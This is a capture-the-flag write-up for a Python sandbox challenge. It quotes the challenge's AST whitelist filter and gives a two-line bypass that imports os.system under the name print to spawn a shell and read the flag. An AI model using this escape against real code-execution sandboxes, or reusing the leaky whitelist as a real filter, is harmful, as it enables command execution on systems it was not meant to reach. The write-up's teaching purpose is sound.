# Finance Calculat0r 2021

## Description

> We launched a scriptable cloud calculat0r for all your financing needs!
>
> `nc challs.rumble.host 42323`
>
> Of course its Open Source

{% file src="../../.gitbook/assets/finance_calculat0r_2021.tar.gz" %}

## Solution

The program allows you to write a Python program to be executed. It checks the AST of the program and only the `print` function is allowed to be called.

```python
WHITELIST_NODES = [
    ast.Expression,
    ast.Expr,
    ast.Num,
    ast.Name,
    ast.Constant,
    ast.Load,
    ast.BinOp,
    ast.Add,
    ast.Sub,
    ast.Module,
    ast.Mult,
    ast.Div,
    ast.Assign,
    ast.Store
]

WHITELIST_FUNCTIONS = [
    "print"
]

...

def check_code_security(code):
    # Decode for parser
    s = code.decode(errors="ignore")
    tree = ast.parse(s, mode='exec')
    for node in ast.walk(tree):
        if type(node) not in WHITELIST_NODES:
            if type(node) == ast.Call and node.func.id not in WHITELIST_FUNCTIONS:
                raise ValueError("Forbidden code used in type '{}'. NOT allowed!".format(type(node)))
```

But note that module imports are allowed. We can simply import a function as `print` to bypass this filter.

```python
from os import system as print
print('/bin/sh')
```

After getting a shell, we can find the flag in `/opt/flag.txt`.

`CSR{OhManSandiNeinNeinDasMachtManNicht}`
